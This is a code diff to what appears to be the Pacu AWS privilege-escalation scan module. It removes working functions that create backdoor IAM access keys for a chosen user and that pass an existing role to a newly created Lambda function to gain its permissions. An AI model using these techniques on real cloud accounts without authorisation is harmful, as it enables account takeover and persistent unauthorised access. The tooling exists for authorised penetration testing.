@@ -11,6 +11,8 @@ import time
 import subprocess
 from utils import remove_empty_from_dict
 
+#from modules.iam__privesc_scan.lib.pass_existing_role_to_new_lambda_then_invoke import *
+
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -1098,38 +1100,6 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
             return False
 
 
-def CreateAccessKey(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-
-    print('  Starting method CreateAccessKey...\n')
-
-    username = input('    Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: ')
-    if fetch_data(['IAM', 'Users'], module_info['prerequisite_modules'][1], '--users') is False:
-        print('Pre-req module not run successfully. Exiting...')
-        return False
-    users = session.IAM['Users']
-    print('Found {} user(s). Choose a user below.'.format(len(users)))
-    print('  [0] Other (Manually enter user name)')
-    for i in range(0, len(users)):
-        print('  [{}] {}'.format(i + 1, users[i]['UserName']))
-    choice = input('Choose an option: ')
-    if int(choice) == 0:
-        username = input('    Enter a user name: ')
-    else:
-        username = users[int(choice) - 1]['UserName']
-
-    # Use the iam__backdoor_users_keys module to do the access key creating
-    try:
-        fetch_data(None, module_info['prerequisite_modules'][2], '--usernames {}'.format(username), force=True)
-    except Exception as e:
-        print('      Failed to create an access key for user {}: {}'.format(username, e))
-        again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
-        if again.strip().lower() == 'y':
-            print('      Re-running CreateAccessKey privilege escalation attempt...')
-            return CreateAccessKey(pacu_main, print, input, fetch_data)
-        else:
-            return False
-    return True
 
 
 def CreateLoginProfile(pacu_main, print, input, fetch_data):
@@ -1667,70 +1637,6 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     return True
 
 
-def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='', region=None):
-    session = pacu_main.get_active_session()
-
-    if zip_file == '':
-        zip_file = './modules/{}/lambda.zip'.format(module_info['name'])
-
-    if region is None:
-        regions = pacu_main.get_regions('lambda')
-
-        if len(regions) > 1:
-            print('  Found multiple valid regions to use. Choose one below.\n')
-            for i in range(0, len(regions)):
-                print('  [{}] {}'.format(i, regions[i]))
-            choice = input('  What region do you want to create the Lambda function in? ')
-            region = regions[int(choice)]
-        elif len(regions) == 1:
-            region = regions[0]
-        else:
-            while not region:
-                all_lambda_regions = pacu_main.get_regions('lambda', check_session=False)
-                region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
-                if not region:
-                    return False
-                elif region not in all_lambda_regions:
-                    print('    Region {} is not a valid Lambda region. Please choose a valid region. Valid Lambda regions include:\n'.format(region))
-                    print(all_lambda_regions)
-                    region = None
-
-    client = pacu_main.get_boto3_client('lambda', region)
-
-    target_role_arn = input('  Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
-
-    if not target_role_arn:
-        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][1], '--roles', force=True) is False:
-            print('Pre-req module not run successfully. Exiting...')
-            return False
-        roles = deepcopy(session.IAM['Roles'])
-
-        print('Found {} roles. Choose one below.'.format(len(roles)))
-        for i in range(0, len(roles)):
-            print('  [{}] {}'.format(i, roles[i]['RoleName']))
-        choice = input('Choose an option: ')
-        target_role_arn = roles[int(choice)]['Arn']
-
-    print('Using role {}. Trying to create a new Lambda function...\n'.format(target_role_arn))
-
-    function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
-
-    with open(zip_file, 'rb') as f:
-        lambda_zip = f.read()
-
-    # Put the error handling in the function calling this function
-    client.create_function(
-        FunctionName=function_name,
-        Runtime='python3.6',
-        Role=target_role_arn,
-        Code={
-            'ZipFile': lambda_zip
-        },
-        Timeout=30,
-        Handler='lambda_function.lambda_handler'
-    )
-    print('Successfully created a Lambda function {} in region {}!\n'.format(function_name, region))
-    return (function_name, region)
 
 
 def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
